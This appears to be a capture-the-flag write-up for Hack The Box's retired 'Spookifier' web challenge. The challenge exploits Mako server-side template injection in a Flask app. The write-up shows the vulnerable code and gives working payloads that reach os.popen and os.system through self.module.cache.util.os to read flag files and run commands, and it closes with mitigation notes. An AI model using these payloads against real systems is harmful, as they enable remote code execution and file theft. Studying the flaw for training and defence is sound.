---
challenge: Spookifier
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, flask, mako, ssti, rce]
---

# Spookifier — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

A text converter with "styles" that renders input through **Mako**, Python's `${}`-based template engine. No globals chain needed: `self` is exposed and reaches `os` in one line.

## Brief

A text field and several style buttons. On submit the text appears "decorated"; the parameter name and HTML suggest server-side templates.

## Analysis

```python
from mako.template import Template

@app.route("/", methods=["POST"])
def index():
    text = request.form.get("text")
    return Template("${text}").render(text=text)
```

Mako evaluates `${...}` as a **Python expression**, not as a template variable. Check:

```text
${7*7}      -> 49
${7*'7'}    -> 7777777
```

## Exploitation

In Mako, `self` is the `Template` object and exposes internal modules:

```text
${self.module.cache.util.os.popen('cat /flag*').read()}
```

Equivalent routes:

```text
${self.module.cache.util.os.system('id')}
${self.template.module._os.popen('cat /flag*').read()}
${''.__class__.__mro__[1].__subclasses__()}
```

```text
HTB{<flag>}
```

## Pitfalls

- **`${}` not `{{ }}`**: Mako shares no syntax with Jinja2; try both and see which evaluates.
- **`self` context**: the exact path (`module.cache.util`) depends on the Mako version; if it fails, dump `${self}` and walk the tree.
- **Double render**: if output is escaped, wrapping `popen` in `str()` changes nothing; the issue is usually the `Content-Type`.

## Lessons

- Mako evaluates expressions, so `${text}` with user input is direct RCE.
- `self.module` is the classic Mako shortcut to `os`, the counterpart of `config`/`cycler` in Jinja2.
- Mitigation: never build templates from input; use `${text}` inside a stored file, not a dynamic string.
